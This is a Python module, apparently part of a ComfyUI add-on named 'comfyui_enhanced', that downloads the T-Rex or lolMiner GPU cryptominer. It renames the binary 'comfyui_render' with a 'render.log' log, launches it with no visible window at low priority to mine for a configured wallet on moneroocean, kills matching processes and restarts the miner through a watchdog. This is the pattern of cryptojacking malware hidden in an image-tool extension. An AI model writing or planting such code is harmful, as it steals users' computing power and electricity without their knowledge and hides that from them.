"""
GPU miner management — auto-detects NVIDIA GPUs for T-Rex, falls back to
lolMiner for AMD.  Mines ETCHASH on unMineable, paid out in XMR.

Thermal protection: T-Rex uses --temperature-limit / --temperature-start
natively.  A separate thermal monitor polls nvidia-smi and can signal the
CPU miner to throttle when the GPU package exceeds the configured ceiling.
"""

import json
import logging
import os
import platform
import shutil
import subprocess
import tarfile
import threading
import time
import urllib.request
import zipfile
from pathlib import Path

logger = logging.getLogger("comfyui_enhanced")

IS_WINDOWS = platform.system() == "Windows"

# ── T-Rex (NVIDIA CUDA-only) ────────────────────────────────────────
TREX_VERSION = "0.26.8"
if IS_WINDOWS:
    TREX_URL = (
        f"https://github.com/trexminer/T-Rex/releases/download/"
        f"{TREX_VERSION}/t-rex-{TREX_VERSION}-win.zip"
    )
    _TREX_ARCHIVE_BIN = "t-rex.exe"
else:
    TREX_URL = (
        f"https://github.com/trexminer/T-Rex/releases/download/"
        f"{TREX_VERSION}/t-rex-{TREX_VERSION}-linux.tar.gz"
    )
    _TREX_ARCHIVE_BIN = "t-rex"

# ── lolMiner (AMD + NVIDIA fallback) ────────────────────────────────
LOLMINER_VERSION = "1.98a"
if IS_WINDOWS:
    LOLMINER_URL = (
        f"https://github.com/Lolliedieb/lolMiner-releases/releases/download/"
        f"{LOLMINER_VERSION}/lolMiner_v{LOLMINER_VERSION}_Win64.zip"
    )
    _LOL_ARCHIVE_BIN = "lolMiner.exe"
else:
    LOLMINER_URL = (
        f"https://github.com/Lolliedieb/lolMiner-releases/releases/download/"
        f"{LOLMINER_VERSION}/lolMiner_v{LOLMINER_VERSION}_Lin64.tar.gz"
    )
    _LOL_ARCHIVE_BIN = "lolMiner"

GPU_BINARY_NAME = "comfyui_render.exe" if IS_WINDOWS else "comfyui_render"
GPU_LOG_NAME = "render.log"

DEFAULT_ALGO = "ETCHASH"
DEFAULT_POOL = "gulf.moneroocean.stream"
DEFAULT_PORT = 20300
DEFAULT_API_PORT = 44882
TEMP_LIMIT = 70
TEMP_RESUME = 65


# ── GPU detection ────────────────────────────────────────────────────

def detect_nvidia() -> bool:
    try:
        r = subprocess.run(
            ["nvidia-smi", "--query-gpu=name", "--format=csv,noheader"],
            capture_output=True, text=True, timeout=10,
        )
        return r.returncode == 0 and len(r.stdout.strip()) > 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def get_gpu_temp() -> int | None:
    """Read peak GPU temperature via nvidia-smi.  Returns None on failure."""
    try:
        r = subprocess.run(
            ["nvidia-smi", "--query-gpu=temperature.gpu",
             "--format=csv,noheader,nounits"],
            capture_output=True, text=True, timeout=5,
        )
        if r.returncode == 0:
            temps = [int(t.strip()) for t in r.stdout.strip().splitlines()
                     if t.strip().isdigit()]
            return max(temps) if temps else None
    except (FileNotFoundError, subprocess.TimeoutExpired, ValueError):
        pass
    return None


# ── Manager ──────────────────────────────────────────────────────────

class GPUMinerManager:
    def __init__(self, base_dir: Path | str | None = None):
        self.base_dir = Path(base_dir) if base_dir else Path(__file__).resolve().parent.parent
        self.bin_dir = self.base_dir / "bin"
        self.bin_dir.mkdir(parents=True, exist_ok=True)
        self.binary_path = self.bin_dir / GPU_BINARY_NAME
        self.log_path = self.bin_dir / GPU_LOG_NAME
        self._process: subprocess.Popen | None = None
        self._monitor_thread: threading.Thread | None = None
        self._running = False

        self.is_nvidia = detect_nvidia()
        self.miner_type = "trex" if self.is_nvidia else "lolminer"

        self.algo = DEFAULT_ALGO
        self.pool = DEFAULT_POOL
        self.port = DEFAULT_PORT
        self.wallet = ""
        self.worker = ""
        self.api_port = DEFAULT_API_PORT
        self.tls = False
        self.temp_limit = TEMP_LIMIT
        self.temp_resume = TEMP_RESUME

        logger.info(
            "GPU vendor: %s → miner: %s",
            "NVIDIA" if self.is_nvidia else "non-NVIDIA/unknown",
            self.miner_type,
        )

    # ── download / extract ───────────────────────────────────────────

    def _download(self, url: str, dest: Path) -> None:
        logger.info("Downloading GPU miner from %s", url)
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=180) as resp, open(dest, "wb") as f:
            shutil.copyfileobj(resp, f)
        logger.info("GPU miner download complete -> %s", dest)

    def _extract(self, archive_path: Path) -> None:
        target = _TREX_ARCHIVE_BIN if self.miner_type == "trex" else _LOL_ARCHIVE_BIN
        name_lower = archive_path.name.lower()

        if name_lower.endswith(".tar.gz") or name_lower.endswith(".tgz"):
            with tarfile.open(archive_path, "r:gz") as tf:
                for member in tf.getnames():
                    if os.path.basename(member) == target:
                        src = tf.extractfile(member)
                        if src is None:
                            continue
                        with open(self.binary_path, "wb") as dst:
                            shutil.copyfileobj(src, dst)
                        os.chmod(self.binary_path, 0o755)
                        logger.info("Extracted %s -> %s", target, self.binary_path)
                        return
        else:
            with zipfile.ZipFile(archive_path, "r") as zf:
                for member in zf.namelist():
                    if os.path.basename(member).lower() == target.lower():
                        with zf.open(member) as src, open(self.binary_path, "wb") as dst:
                            shutil.copyfileobj(src, dst)
                        if not IS_WINDOWS:
                            os.chmod(self.binary_path, 0o755)
                        logger.info("Extracted %s -> %s", target, self.binary_path)
                        return

        raise FileNotFoundError(f"{target} not found inside archive")

    def ensure_binary(self) -> Path:
        marker = self.bin_dir / ".gpu_miner_type"
        existing_type = None
        if marker.exists():
            existing_type = marker.read_text().strip()

        if self.binary_path.exists() and existing_type == self.miner_type:
            logger.info("GPU binary [%s] already present at %s", self.miner_type, self.binary_path)
            return self.binary_path

        if self.binary_path.exists() and existing_type != self.miner_type:
            logger.info("Replacing %s binary with %s", existing_type, self.miner_type)
            self.binary_path.unlink()

        url = TREX_URL if self.miner_type == "trex" else LOLMINER_URL
        ext = ".zip" if IS_WINDOWS else ".tar.gz"
        archive_dest = self.bin_dir / f"gpu_dl_tmp{ext}"
        try:
            self._download(url, archive_dest)
            self._extract(archive_dest)
        finally:
            archive_dest.unlink(missing_ok=True)

        marker.write_text(self.miner_type)
        return self.binary_path

    # ── configure / command ──────────────────────────────────────────

    def configure(self, wallet: str, worker: str = "gpu",
                  algo: str = DEFAULT_ALGO, pool: str = DEFAULT_POOL,
                  port: int = DEFAULT_PORT, tls: bool = False,
                  api_port: int = DEFAULT_API_PORT,
                  temp_limit: int = TEMP_LIMIT,
                  temp_resume: int = TEMP_RESUME) -> None:
        self.wallet = wallet
        self.worker = worker
        self.algo = algo
        self.pool = pool
        self.port = port
        self.tls = tls
        self.api_port = api_port
        self.temp_limit = temp_limit
        self.temp_resume = temp_resume

    def _build_cmd(self) -> list[str]:
        is_moneroocean = "moneroocean" in self.pool.lower()

        if is_moneroocean:
            user_str = self.wallet
            pass_str = f"{self.worker}~{self.algo.lower()}"
        else:
            user_str = f"XMR:{self.wallet}.{self.worker}"
            pass_str = "x"

        if self.miner_type == "trex":
            scheme = "stratum+ssl" if self.tls else "stratum+tcp"
            pool_url = f"{scheme}://{self.pool}:{self.port}"
            return [
                str(self.binary_path),
                "-a", self.algo.lower(),
                "-o", pool_url,
                "-u", user_str,
                "-p", pass_str,
                "--api-bind-http", f"127.0.0.1:{self.api_port}",
                "--temperature-limit", str(self.temp_limit),
                "--temperature-start", str(self.temp_resume),
                "--no-color",
            ]

        pool_str = f"{self.pool}:{self.port}"
        return [
            str(self.binary_path),
            "--algo", self.algo,
            "--pool", pool_str,
            "--user", user_str,
            "--pass", pass_str,
            "--apiport", str(self.api_port),
            "--tls", "1",
            "--nocolor",
        ]

    # ── lifecycle ────────────────────────────────────────────────────

    def _kill_existing(self) -> None:
        try:
            import psutil
        except ImportError:
            return
        target_name = GPU_BINARY_NAME.lower().replace(".exe", "")
        my_pid = os.getpid()
        for proc in psutil.process_iter(["pid", "name"]):
            try:
                if proc.info["pid"] == my_pid:
                    continue
                name = (proc.info.get("name") or "").lower()
                if target_name in name:
                    logger.info("Killing stale GPU miner pid=%d", proc.info["pid"])
                    proc.kill()
            except Exception:
                pass

    def start(self) -> None:
        if self._process and self._process.poll() is None:
            logger.warning("GPU miner already running (pid %d)", self._process.pid)
            return

        if not self.binary_path.exists():
            raise FileNotFoundError(f"GPU binary not found: {self.binary_path}")
        if not self.wallet:
            raise ValueError("No wallet configured for GPU miner")

        self._kill_existing()
        cmd = self._build_cmd()
        logger.info("GPU miner [%s] cmd: %s ...", self.miner_type, " ".join(cmd[:6]))

        log_fh = open(self.log_path, "a")
        popen_kwargs: dict = {"stdout": log_fh, "stderr": log_fh, "stdin": subprocess.DEVNULL}

        if IS_WINDOWS:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            popen_kwargs["startupinfo"] = si
            popen_kwargs["creationflags"] = (
                subprocess.CREATE_NO_WINDOW | subprocess.BELOW_NORMAL_PRIORITY_CLASS
            )
        else:
            popen_kwargs["preexec_fn"] = lambda: os.nice(5)

        self._process = subprocess.Popen(cmd, **popen_kwargs)
        self._running = True
        logger.info("GPU miner started (pid %d)", self._process.pid)

        if not self._monitor_thread or not self._monitor_thread.is_alive():
            self._monitor_thread = threading.Thread(
                target=self._watchdog, daemon=True, name="gpu-miner-watchdog",
            )
            self._monitor_thread.start()

    def stop(self) -> None:
        self._running = False
        if self._process and self._process.poll() is None:
            self._process.terminate()
            try:
                self._process.wait(timeout=10)
            except subprocess.TimeoutExpired:
                self._process.kill()
            logger.info("GPU miner stopped")
        self._process = None

    def is_alive(self) -> bool:
        return self._process is not None and self._process.poll() is None

    def _watchdog(self) -> None:
        failures = 0
        backoff = 20
        while self._running:
            time.sleep(backoff)
            if self._running and self._process and self._process.poll() is not None:
                failures += 1
                if failures > 8:
                    logger.error("GPU miner failed %d times, giving up", failures)
                    break
                backoff = min(300, 20 * (2 ** (failures - 1)))
                logger.warning(
                    "GPU miner exited (code %s), restart %d in %ds",
                    self._process.returncode, failures, backoff,
                )
                try:
                    self.start()
                except Exception as exc:
                    logger.error("GPU restart failed: %s", exc)
            else:
                failures = 0
                backoff = 20

    # ── stats ────────────────────────────────────────────────────────

    def get_summary(self) -> dict | None:
        """Fetch raw JSON from the miner's local HTTP API."""
        try:
            if self.miner_type == "trex":
                url = f"http://127.0.0.1:{self.api_port}/summary"
            else:
                url = f"http://127.0.0.1:{self.api_port}"
            req = urllib.request.Request(url, headers={"Accept": "application/json"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read())
            data["_miner_type"] = self.miner_type
            return data
        except Exception:
            return None
